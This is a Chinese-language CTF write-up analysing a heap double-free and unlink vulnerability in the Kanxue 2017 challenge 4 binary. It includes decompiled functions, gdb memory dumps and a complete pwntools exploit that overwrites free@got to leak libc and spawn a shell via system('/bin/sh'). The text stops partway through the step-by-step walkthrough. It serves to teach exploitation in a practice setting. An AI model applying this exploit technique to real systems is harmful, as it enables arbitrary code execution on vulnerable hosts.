
# [原创]由看雪.Wifi万能钥匙 CTF 2017 第4题分析linux double free及unlinking漏洞

相关程序可以在这里下载：[becK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3y4@1k6W2)9J5k6i4m8W2k6r3W2&6i4K6u0W2j5$3!0E0i4K6u0r3k6$3q4E0k6g2)9J5k6r3k6A6k6$3S2@1i4K6u0V1x3K6c8Q4x3X3g2Z5N6r3@1.](<https://bbs.kanxue.com/elink@1beK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3y4@1k6W2)9J5k6i4m8W2k6r3W2&6i4K6u0W2j5$3!0E0i4K6u0r3k6$3q4E0k6g2)9J5k6r3k6A6k6$3S2@1i4K6u0V1x3K6c8Q4x3X3g2Z5N6r3@1>.)

我是在 ubuntu16 64 位调试的。

## 知识点

先说下知识点吧，简单的请参考我的上一篇文章：[ce5K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6Q4x3X3g2U0M7$3c8F1i4K6u0W2L8X3g2@1i4K6u0r3M7i4q4Q4y4h3j5K6y4e0f1I4z5e0t1#2y4q4)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3y4K6M7#2x3K6t1J5y4o6R3.](<https://bbs.kanxue.com/elink@9eaK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8X3u0D9L8$3N6Q4x3X3g2U0M7$3c8F1i4K6u0W2L8X3g2@1i4K6u0r3M7i4q4Q4y4h3j5K6y4e0f1I4z5e0t1#2y4q4)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1k6V1k6i4c8S2K9h3I4K6i4K6u0r3y4K6M7#2x3K6t1J5y4o6R3>.)

现在 `unlink` 函数加了个判断需要绕过：

![](https://bbs.kanxue.com/upload/attach/201709/583515_7isdswtyorwkv5l.png)

即必须保证 `FD->bk = P` 并且 `BK->fd = P`。

为了绕过这个验证，需要找到一个地址 `x`，使 `*x = p`。

释放 `chunk` 前，检查 `FD->bk = BK->fd = P`，`P` 为当前需要 `free` 的 `chunk` 指针，`BK` 为前一个 `chunk` 的指针，`FD` 为后一个 `chunk` 的指针。如果有一个堆指针可控，并在一个 `chunk` 的数据段内，再如果有个可控的地址是指向 `P` 的，记为 `*X = P`。那么我们就在此 `chunk` 上构造两个 `chunk`，第一个 `chunk` 在 `pre_size` 的标志位 `P` 设为 `1`，大小到 `P` 结束，第二个 `chunk` 的 `pre_size` 的标志位 `P` 设为 `0`。针对 64 位系统，第一个 `chunk` 的 `fd` 设为 `(X - 0x18)`，`bk` 设为 `(X - 0x10)`，即 `P->fd = (X - 0x18)`，`P->bk = (X - 0x10)`。又因为 `*X = P`，所以 `(X - 0x18)->bk = P`，`(X - 0x10)->fd = P`，通过 `unlink` 的检查。按照 `unlink` 的宏代码，`unlink` 过程中 `X` 的内容前后被写为 `(X - 0x10)`、`(X - 0x18)`，最终 `X` 的内容被我们改写。

如果发生向内存低址合并的时候，`bk + 0x10` is overwritten with `fd`。

记住以上知识点。

## 函数分析

先分析一下 `create`、`edit`、`delete` 这三个函数。

### `create` 函数

利用 `IDA` 分析一下 `create` 函数：

```
int create()

{

int result; // eax@1

char buf; // [sp+0h] [bp-90h]@5

void *dest; // [sp+80h] [bp-10h]@4

int index; // [sp+88h] [bp-8h]@3

size_t nbytes; // [sp+8Ch] [bp-4h]@2

result = dword_6020AC;

if ( dword_6020AC <= 4 )

{

puts("Input size");

result = read_int();

LODWORD(nbytes) = result;

if ( result <= 4096 )

{

puts("Input cun");

result = read_int();

index = result;

if ( result <= 4 )

{

dest = malloc((signed int)nbytes);

puts("Input content");

if ( (signed int)nbytes > 112 )

{

read(0, dest, (unsigned int)nbytes);

}

else

{

read(0, &buf, (unsigned int)nbytes);

memcpy(dest, &buf, (signed int)nbytes);

}

     *(_DWORD *)(qword_6020C0 + 4LL * index) = nbytes;

        *((_QWORD *)&unk_6020E0 + 2 * index) = dest;

        dword_6020E8[4 * index] = 1;

++dword_6020AC;

result = fflush(stdout);

}

}

}

return result;

}
```

可以看到当创建 `heap` 的时候，会将 `malloc` 的返回值保存到以 `0x6020e0` 为起始地址的位置，如果分配了就将 `1` 写入到以 `0x6020e8` 为起始地址的位置（也就是 `flag` 值），如下所示：

```
gdb-peda$ x/50gx 0x6020c0

0x6020c0:0x0000000001e8c0100x0000000000000000

0x6020d0:0x00000000000000000x0000000000000000

0x6020e0:0x0000000001e8c0600x0000000000000001

0x6020f0:        0x0000000001e8c1a00x0000000000000001

0x602100:0x0000000001e8c0900x0000000000000000

0x602110:0x00000000000000000x0000000000000000
```

堆的大小保存在以 `0x1e8c010` 为起始地址处。

```
gdb-peda$ x/wx 0x6020c0

0x6020c0:0x01e8c010

gdb-peda$ x/wx 0x1e8c010

0x1e8c010:0x00000020

gdb-peda$ x/10wx 0x1e8c010

0x1e8c010:0x000000200x000001000x000001000x00000000

0x1e8c020:0x000000000x000000000x000000310x00000000

0x1e8c030:0x696465700x00000079
```

### `delete` 函数

```
__int64 delete()

{

__int64 result; // rax@1

int v1; // [sp+Ch] [bp-4h]@1

puts("Chose one to dele");

result = read_int();

v1 = result;

if ( (signed int)result <= 4 )

{

free(*((void **)&unk_6020E0 + 2 * (signed int)result));

dword_6020E8[4 * v1] = 0;

puts("dele success!");

result = (unsigned int)(dword_6020AC-- - 1);

}

return result;

}
```

在进行删除操作时，直接从 `0x6020e0 + index * 0x10` 处获取堆指针，然后使用 `free` 函数删除堆，然后将 `0x6020e8 + index * 0x10` 处设置为 `0`（将 `flag` 置 `1`）。

### `edit` 函数

```
int edit()

{

int result; // eax@1

int index; // [sp+Ch] [bp-4h]@1

puts("Chose one to edit");

result = read_int();

index = result;

if ( result <= 4 )

{

result = dword_6020E8[4 * result];

if ( result == 1 )

{

puts("Input the content");

read(0, *((void **)&unk_6020E0 + 2 * index), *(_DWORD *)(4LL * index + qword_6020C0));

result = puts("Edit success!");

}

}

return result;

}
```

在进行 `edit` 操作时，首先根据 `index` 从 `0x6020e8 + 0x10 * index` 处获取以前保存的 `flag` 值，如果 `flag = 0` 说明已经 `free` 了，如果 `flag = 1` 说明已经分配，可以编辑，然后获取 `0x6020e0 + index * 0x10` 处的指针，然后将用户输入的数据写入该指针对应的地址处。大小符合 `poi(0x6020c0) + index * 0x10` 处保存的大小。

这三个函数已经分析完了。

## EXP 分析

我先把 `exp` 贴出来一点点分析：

```
#!/usr/bin/env python

from pwn import *

import sys

context.arch = 'amd64'

if len(sys.argv) < 2:
    p = process('./4-ReeHY-main')
    #context.log_level = 'debug'
else:
    p = remote(sys.argv[1], int(sys.argv[2]))#gdb.attach(p,'b *0x400cf5 \nb *0x400b62')

def welcome():
    p.recvuntil('name: \n$')
    p.send('pediy')

def create(index,size,content):
    p.recvuntil('*********\n$')
    p.send('1')
    p.recvuntil('Input size\n')
    p.send(str(size))
    p.recvuntil('Input cun\n')
    p.send(str(index))
    p.recvuntil('Input content\n')
    p.send(content)

def delete(index):
    p.recvuntil('*********\n$')
    p.send('2')
    p.recvuntil('Chose one to dele\n')
    p.send(str(index))

def edit(index,content):
    p.recvuntil('*********\n$')
    p.send('3')
    p.recvuntil('to edit\n')
    p.send(str(index))
    p.recvuntil('the content\n')
    p.send(content)

def exp():
    #system_off = 0x46590
    #puts_off = 0x6fd60
    #binsh_off = 0x180103
    #pop_ret_addr = 0x400DA3
    #system_off = 0x41fd0
    #puts_off = 0x6cee0
    system_off = 0x45390
    puts_off = 0x6f690
    got_addr = 0x602018    #free@got
    p_addr = 0x602100
    puts_plt = 0x4006d0

    welcome()
    create(0,0x20,'/bin/sh\x00')
    log.info('gen point to control...')
    pause()
    create(2,0x100,'BBBB')
    create(1,0x100,'CCCC')
    delete(2)
    delete(1)

    payload = p64(0)+p64(0x101)+p64(p_addr-0x18)+p64(p_addr-0x10)+'A'*(0x100-32)+p64(0x100)+p64(0x210-0x100)
    create(2,0x210,payload)
    delete(1)

    log.info('leaking address...')
    edit(2,p64(1)+p64(got_addr)+p64(1)+p64(got_addr+8)+p64(1))
    edit(1,p64(puts_plt))
    delete(2)

    puts_addr = p.recv(6)
    log.info('puts address:'+hex(u64(puts_addr+'\x00'*2)))
    system_addr = u64(puts_addr+'\x00'*2)-puts_off+system_off
    log.info('system address:'+hex(system_addr))
    log.info('get shell!!!')
    edit(1,p64(system_addr))
    delete(0)
    p.interactive()

if __name__ == '__main__':
    exp()
```

我们的目的就是改写 `got` 段，比如将 `free@got` 的地址改写为 `system@got` 或者 `put@got` 这样，当调用 `free` 函数的时候，就可以执行 `system` 函数或者 `put` 函数了。

怎么改写 `got` 段呢？在 `unlink` 的时候，有一处覆写可以利用，然后在地址 `0x6020e0` 开始处保存了堆的指针，如果该处可以被改写，那么在以后 `edit` 函数调用了，就可以改写指针对应地址的数据了。

下边详细分析一下吧。

```
create(0,0x20,'/bin/sh\x00')
create(2,0x100,'BBBB')
create(1,0x100,'CCCC')
```

创建三个堆，`index` 分别为 `0`、`2`、`1`，大小分别是 `0x20`、`0x100`、`0x100`，此时内存布局是这样的：

```
gdb-peda$ x/10gx 0x6020e0

0x6020e0:0x0000000001e8c0600x0000000000000001

0x6020f0:        0x0000000001e8c1a00x0000000000000001

0x602100:0x0000000001e8c0900x0000000000000001

gdb-peda$ x/100gx 0x1e8c060

0x1e8c060:0x0068732f6e69622f0x00007ffea2378a50

0x1e8c070:0x000000000000000a0xffffffffffffffff

0x1e8c080:0x00000000000000000x0000000000000111

0x1e8c090:0x00000000424242420x0000000000000000

0x1e8c0a0:0x00000000000000000x0000000000000000

0x1e8c0b0:0x00000000000000000x0000000000000000

0x1e8c0c0:0x00000000000000000x0000000000000000

0x1e8c0d0:0x00000000000000000x0000000000000000

0x1e8c0e0:0x00000000000000000x0000000000000000

0x1e8c0f0:0x00000000000000000x0000000000000000

0x1e8c100:0x00000000000000000x0000000000000000

0x1e8c110:0x00000000000000000x0000000000000000

0x1e8c120:0x00000000000000000x0000000000000000

0x1e8c130:0x00000000000000000x0000000000000000

0x1e8c140:0x00000000000000000x0000000000000000

0x1e8c150:0x00000000000000000x0000000000000000

0x1e8c160:0x00000000000000000x0000000000000000

0x1e8c170:0x00000000000000000x0000000000000000

0x1e8c180:0x00000000000000000x0000000000000000

0x1e8c190:0x00000000000000000x0000000000000111

0x1e8c1a0:0x00000000434343430x0000000000000000

0x1e8c1b0:0x00000000000000000x0000000000000000

0x1e8c1c0:0x00000000000000000x0000000000000000

0x1e8c1d0:0x00000000000000000x0000000000000000

0x1e8c1e0:0x00000000000000000x0000000000000000

0x1e8c1f0:0x00000000000000000x0000000000000000

0x1e8c200:0x00000000000000000x0000000000000000

0x1e8c210:0x00000000000000000x0000000000000000

0x1e8c220:0x00000000000000000x0000000000000000
```

然后是：

```
delete(2)
```
